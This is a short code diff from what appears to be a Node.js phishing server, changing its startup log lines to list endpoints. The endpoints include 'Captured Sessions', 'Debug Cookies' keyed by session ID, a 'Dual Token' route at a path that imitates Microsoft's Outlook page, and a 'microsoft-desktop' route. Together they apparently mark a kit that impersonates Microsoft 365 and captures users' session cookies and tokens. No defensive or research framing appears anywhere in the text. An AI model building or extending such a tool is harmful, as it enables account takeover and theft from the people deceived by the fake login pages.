-  console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
-  console.log(`🔍 Debug cookies: http://localhost:${PORT}/debug-cookies/[sessionId]`);
-  console.log(`🔍 Debug all: http://localhost:${PORT}/debug-all`);
-  console.log(`🔍 Debug sessions: http://localhost:${PORT}/debug-sessions`);
-  console.log(`❤️ Health check: http://localhost:${PORT}/health`);
+  console.log(`\n🚀 ========== SERVER STARTED ==========`);
+  console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
+  console.log(`🌐 App URL: ${cleanAppUrl}`);
+  console.log(`📡 Port: ${PORT}`);
+  console.log(`========================================\n`);
+  
+  console.log(`🔗 Available endpoints:`);
+  console.log(`   ↪️  Root: ${cleanAppUrl}/`);
+  console.log(`   🎯 Dual Token: ${cleanAppUrl}/en-us/microsoft-365/outlook`);
+  console.log(`   🖥️  Desktop: ${cleanAppUrl}/microsoft-desktop`);
+  console.log(`   📋 Captured Sessions: ${cleanAppUrl}/captured-sessions`);
+  console.log(`   🔍 Debug Cookies: ${cleanAppUrl}/debug-cookies/[sessionId]`);
+  console.log(`   ❤️  Health: ${cleanAppUrl}/health\n`);
 });
